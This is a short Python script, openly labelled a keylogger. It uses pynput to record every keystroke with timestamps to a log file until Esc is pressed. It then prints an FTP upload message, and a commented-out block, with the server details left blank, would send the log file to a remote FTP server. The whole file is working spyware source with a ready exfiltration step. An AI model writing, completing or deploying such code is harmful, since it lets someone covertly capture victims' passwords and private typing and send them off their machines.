from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = "output"
filename = "keylog-res.txt"

logging.basicConfig(filename=f'{logdir}/{filename}',
                    level=logging.DEBUG,
                    format="%(asctime)s:%(message)s")


def pressing_key(key):
  try:
    logging.info(str(key))
  except AttributeError:
    print("A special key {0} has been pressed".format(key))


def releasing_key(key):
  if key == Key.esc:
    return False


print('\nStart keylogger\n')

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
  listener.join()


print(f'\nConnecting to FTP and send file {filename} data\n')

# sess = ftplib.FTP("", "", "")
# file = open("keylog-res.txt", "rb")
# sess.storbinary("Store-keulog.txt", file)
# file.close()
# sess.quit()

